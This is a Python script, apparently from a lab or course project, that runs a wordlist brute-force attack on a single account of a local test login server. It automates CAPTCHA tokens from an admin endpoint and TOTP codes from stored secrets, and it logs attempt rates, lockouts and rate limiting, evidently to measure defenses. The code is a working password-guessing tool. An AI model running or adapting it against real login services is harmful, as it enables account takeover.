#!/usr/bin/env python3
"""
Brute Force Attack Script

Targets a single user account, trying passwords from a wordlist.
Handles CAPTCHA and TOTP automation as per plan.md requirements.
"""

import json
import time
import argparse
import requests
import pyotp
from pathlib import Path


GROUP_SEED = 897878
DEFAULT_MAX_ATTEMPTS = 50000
DEFAULT_TIME_LIMIT = 7200  # 2 hours in seconds


def load_wordlist(path: str) -> list[str]:
    """Load passwords from wordlist file, ignoring comments and empty lines."""
    passwords = []
    with open(path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                passwords.append(line)
    return passwords


def load_totp_secrets(users_json_path: str) -> dict:
    """Load TOTP secrets from users.json or totp_secrets.json if available."""
    secrets = {}
    
    # Try totp_secrets.json first
    secrets_path = Path(users_json_path).parent / "totp_secrets.json"
    if secrets_path.exists():
        with open(secrets_path, 'r') as f:
            secrets = json.load(f)
    
    return secrets


def get_captcha_token(base_url: str) -> str | None:
    """Fetch CAPTCHA token from admin endpoint."""
    try:
        response = requests.get(
            f"{base_url}/admin/get_captcha_token",
            params={"group_seed": GROUP_SEED}
        )
        if response.status_code == 200:
            return response.json().get("captcha_token")
    except Exception as e:
        print(f"[!] Failed to get CAPTCHA token: {e}")
    return None


def attempt_login(base_url: str, username: str, password: str, captcha_token: str | None = None) -> dict:
    """
    Attempt to login with given credentials.
    Returns dict with: success, requires_captcha, requires_totp, message, latency_ms
    """
    start_time = time.time()
    
    payload = {"username": username, "password": password}
    if captcha_token:
        payload["captcha_token"] = captcha_token
    
    try:
        response = requests.post(f"{base_url}/login", json=payload)
        latency_ms = (time.time() - start_time) * 1000
        
        data = response.json()
        message = data.get("message", data.get("detail", ""))
        
        result = {
            "success": False,
            "requires_captcha": False,
            "requires_totp": False,
            "message": message,
            "latency_ms": latency_ms,
            "status_code": response.status_code
        }
        
        if response.status_code == 200:
            if "2FA Required" in message:
                result["requires_totp"] = True
            elif "successful" in message.lower():
                result["success"] = True
        elif response.status_code == 400 and "Captcha required" in message:
            result["requires_captcha"] = True
        elif response.status_code == 429:
            result["rate_limited"] = True
        elif response.status_code == 403 and "locked" in message.lower():
            result["locked_out"] = True
        
        return result
        
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "requires_captcha": False,
            "requires_totp": False,
            "message": "Connection error",
            "latency_ms": 0,
            "status_code": 0
        }


def attempt_totp(base_url: str, username: str, totp_secret: str) -> dict:
    """Attempt TOTP verification."""
    start_time = time.time()
    
    totp = pyotp.TOTP(totp_secret)
    code = totp.now()
    
    try:
        response = requests.post(
            f"{base_url}/login_totp",
            json={"username": username, "totp_code": code}
        )
        latency_ms = (time.time() - start_time) * 1000
        
        data = response.json()
        message = data.get("message", data.get("detail", ""))
        
        return {
            "success": response.status_code == 200 and "successful" in message.lower(),
            "message": message,
            "latency_ms": latency_ms
        }
    except Exception as e:
        return {"success": False, "message": str(e), "latency_ms": 0}


def log_attempt(log_file, username: str, password: str, result: str, latency_ms: float):
    """Log a single attempt to the log file."""
    if log_file:
        entry = {
            "timestamp": time.time(),
            "username": username,
            "password_tried": password,
            "result": result,
            "latency_ms": latency_ms,
            "attack_type": "brute_force"
        }
        log_file.write(json.dumps(entry) + "\n")
        log_file.flush()


def run_brute_force(
    base_url: str,
    username: str,
    wordlist_path: str,
    users_json_path: str,
    max_attempts: int,
    time_limit: int,
    with_totp: bool = False,
    log_path: str = None
):
    """Run brute force attack against a single user."""
    
    print(f"[*] Brute Force Attack")
    print(f"[*] Target: {username}")
    print(f"[*] Server: {base_url}")
    print(f"[*] Max attempts: {max_attempts}")
    print(f"[*] Time limit: {time_limit}s")
    print(f"[*] TOTP automation: {'enabled' if with_totp else 'disabled'}")
    if log_path:
        print(f"[*] Logging to: {log_path}")
    print("-" * 50)
    
    # Load wordlist
    passwords = load_wordlist(wordlist_path)
    print(f"[*] Loaded {len(passwords)} passwords from wordlist")
    
    # Open log file if specified
    log_file = open(log_path, 'a') if log_path else None
    
    # Load TOTP secrets only if enabled
    user_totp_secret = None
    if with_totp:
        totp_secrets = load_totp_secrets(users_json_path)
        user_totp_secret = totp_secrets.get(username)
        if user_totp_secret:
            print(f"[*] TOTP secret found for {username}")
    
    # Attack metrics
    start_time = time.time()
    attempts = 0
    successes = 0
    captcha_fetches = 0
    totp_attempts = 0
    total_latency = 0
    captcha_token = None
    rate_limited = 0
    locked_out = 0
    actual_auth_attempts = 0  # Attempts that actually reached password verification
    
    print("-" * 50)
    print("[*] Starting attack...")
    
    for password in passwords:
        # Check limits
        elapsed = time.time() - start_time
        if attempts >= max_attempts:
            print(f"\n[!] Max attempts ({max_attempts}) reached")
            break
        if elapsed >= time_limit:
            print(f"\n[!] Time limit ({time_limit}s) reached")
            break
        
        attempts += 1
        
        # Attempt login
        result = attempt_login(base_url, username, password, captcha_token)
        total_latency += result["latency_ms"]
        
        # Track blocked attempts
        if result.get("rate_limited"):
            rate_limited += 1
            attempt_result = "Rate_Limited"
        elif result.get("locked_out"):
            locked_out += 1
            attempt_result = "Locked_Out"
        else:
            actual_auth_attempts += 1
            attempt_result = "Success" if result["success"] else "Failure"
            if result["requires_totp"]:
                attempt_result = "TOTP_Required"
        
        log_attempt(log_file, username, password, attempt_result, result["latency_ms"])
        
        # Handle CAPTCHA requirement
        if result["requires_captcha"]:
            print(f"\n[*] CAPTCHA required, fetching token...")
            captcha_token = get_captcha_token(base_url)
            captcha_fetches += 1
            if captcha_token:
                # Retry with token
                result = attempt_login(base_url, username, password, captcha_token)
                total_latency += result["latency_ms"]
        
        # Handle TOTP requirement
        if result["requires_totp"]:
            if user_totp_secret:
                totp_attempts += 1
                totp_result = attempt_totp(base_url, username, user_totp_secret)
                total_latency += totp_result["latency_ms"]
                if totp_result["success"]:
                    result["success"] = True
            else:
                # Password found but TOTP blocks access
                elapsed = time.time() - start_time
                print(f"\n[+] PASSWORD FOUND: '{password}' (but TOTP required - access blocked)")
                print(f"[+] Attempts: {attempts}, Time: {elapsed:.2f}s")
                successes += 1
                break
        
        # Check success
        if result["success"]:
            successes += 1
            elapsed = time.time() - start_time
            print(f"\n[+] SUCCESS! Password found: '{password}'")
            print(f"[+] Attempts: {attempts}, Time: {elapsed:.2f}s")
            break
        
        # Progress indicator
        if attempts % 10 == 0:
            print(f"\r[*] Attempts: {attempts}, Elapsed: {elapsed:.1f}s", end="", flush=True)
    
    # Close log file
    if log_file:
        log_file.close()
        print(f"\n[*] Log saved to: {log_path}")
    
    # Final statistics
    elapsed = time.time() - start_time
    avg_latency = total_latency / attempts if attempts > 0 else 0
    attempts_per_sec = attempts / elapsed if elapsed > 0 else 0
    # Effective APS = only actual auth attempts (excluding rate-limited/locked)
    effective_aps = actual_auth_attempts / elapsed if elapsed > 0 else 0
    
    print("\n" + "=" * 50)
    print("[*] ATTACK SUMMARY")
    print("=" * 50)
    print(f"Target:              {username}")
    print(f"Total attempts:      {attempts}")
    print(f"Actual auth attempts:{actual_auth_attempts}")
    print(f"Rate limited:        {rate_limited}")
    print(f"Locked out:          {locked_out}")
    print(f"Successes:           {successes}")
    print(f"Time elapsed:        {elapsed:.2f}s")
    print(f"Total APS:           {attempts_per_sec:.2f}")
    print(f"Effective APS:       {effective_aps:.2f}")
    print(f"Avg latency:         {avg_latency:.2f}ms")
    print(f"CAPTCHA fetches:     {captcha_fetches}")
    print(f"TOTP attempts:       {totp_attempts}")
    print("=" * 50)
    
    # Return results for logging
    return {
        "username": username,
        "total_attempts": attempts,
        "actual_auth_attempts": actual_auth_attempts,
        "rate_limited": rate_limited,
        "locked_out": locked_out,
        "successes": successes,
        "time_elapsed_s": elapsed,
        "attempts_per_second": attempts_per_sec,
        "effective_aps": effective_aps,
        "avg_latency_ms": avg_latency,
        "captcha_fetches": captcha_fetches,
        "totp_attempts": totp_attempts,
        "group_seed": GROUP_SEED
    }


def main():
    parser = argparse.ArgumentParser(description="Brute Force Attack Script")
    parser.add_argument(
        "--username", "-u",
        required=True,
        help="Target username"
    )
    parser.add_argument(
        "--base-url",
        default="http://127.0.0.1:8000",
        help="Server base URL (default: http://127.0.0.1:8000)"
    )
    parser.add_argument(
        "--wordlist", "-w",
        default=str(Path(__file__).parent / "wordlist.txt"),
        help="Path to wordlist file"
    )
    parser.add_argument(
        "--users-json",
        default=str(Path(__file__).parent.parent.parent / "server" / "users.json"),
        help="Path to users.json (for TOTP secrets)"
    )
    parser.add_argument(
        "--max-attempts",
        type=int,
        default=DEFAULT_MAX_ATTEMPTS,
        help=f"Maximum number of attempts (default: {DEFAULT_MAX_ATTEMPTS})"
    )
    parser.add_argument(
        "--time-limit",
        type=int,
        default=DEFAULT_TIME_LIMIT,
        help=f"Time limit in seconds (default: {DEFAULT_TIME_LIMIT})"
    )
    parser.add_argument(
        "--output", "-o",
        help="Output file for results (JSON)"
    )
    parser.add_argument(
        "--log", "-l",
        help="Log file for individual attempts (JSON-lines format for analyzer)"
    )
    parser.add_argument(
        "--with-totp",
        action="store_true",
        help="Enable TOTP automation (load secrets from totp_secrets.json)"
    )
    
    args = parser.parse_args()
    
    results = run_brute_force(
        base_url=args.base_url,
        username=args.username,
        wordlist_path=args.wordlist,
        users_json_path=args.users_json,
        max_attempts=args.max_attempts,
        time_limit=args.time_limit,
        with_totp=args.with_totp,
        log_path=args.log
    )
    
    # Save results if output specified
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()

